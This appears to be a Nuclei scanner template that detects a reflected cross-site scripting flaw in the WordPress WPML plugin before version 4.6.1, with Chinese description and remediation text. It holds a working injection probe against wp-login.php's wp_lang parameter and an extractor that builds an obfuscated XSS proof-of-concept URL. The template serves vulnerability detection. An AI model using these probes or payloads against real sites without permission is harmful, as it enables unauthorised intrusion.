id: wpml-xss

info:
  name: WordPress Plugin WPML Version < 4.6.1 - 跨站脚本漏洞
  author: bugvsme
  severity: medium
  description: WordPress Plugin WPML Version < 4.6.1 跨站脚本 存在跨站脚本漏洞。该模板通过构造恶意输入并检查响应回显或执行特征，验证目标是否会在浏览器上下文中执行注入脚本。
  remediation: |
    - 对所有可控输入实施严格校验，并在输出到 HTML、JavaScript 或 URL 上下文前完成正确编码。
    - 如为后台或插件组件问题，建议同步更新到厂商已修复版本并审计相关功能入口。
  reference:
    - https://wpml.org/fr/changelog/2023/03/wpml-4-6-1-important-security-update/
    - https://twitter.com/bug_vs_me/status/1652789903766200320
  metadata:
    verified: true
    max-request: 1
  tags: xss,wp,wordpress,wpml,wp-plugin,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp-login.php?wp_lang=en_US%27'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '#039;"='
          - 'wpml_lang'
        condition: and

    extractors:
      - type: dsl
        dsl:
          - 'host + "/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(domain)%0c"'
